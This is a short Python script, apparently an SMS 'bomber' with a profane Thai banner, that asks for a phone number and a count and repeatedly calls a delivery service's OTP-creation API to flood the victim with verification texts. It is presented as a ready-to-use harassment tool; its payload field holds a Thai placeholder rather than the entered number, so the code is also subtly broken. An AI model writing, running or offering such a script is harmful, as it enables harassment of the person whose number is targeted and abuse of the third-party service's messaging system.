import requests,time

print("""
      [SMS FREE BY LTEMX2]
          Free Free
	  ฟรีไงไอ้สัส
""")

no = input('ตัวอย่าง : 08xx\n[👉] เบอร์: ')
jml = int(input('[👉] จำนวน: '))

heder = {'Host': 'api2.1112.com',
'content-length': '44',
'user-agent': 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36',
'accept-language': 'th-TH,th;q=0.9,en;q=0.8',
}

data = {"phonenumber":"ลบออกและใส่เบอร์ที่จะยิง","language":"th"}

print("\n[กำลังส่ง]")
for i in range(jml):
      sec = requests.post('https://api2.1112.com/api/v1/otp/create', headers=heder, json=data)
      if 'eror' in sec.text:
           print(f'{i+1}. เบอร์ {no}')
      else:
           print(f'{i+1}. เบอร์ {no}')
      time.sleep(2.0)
      
#เครดิตSCK
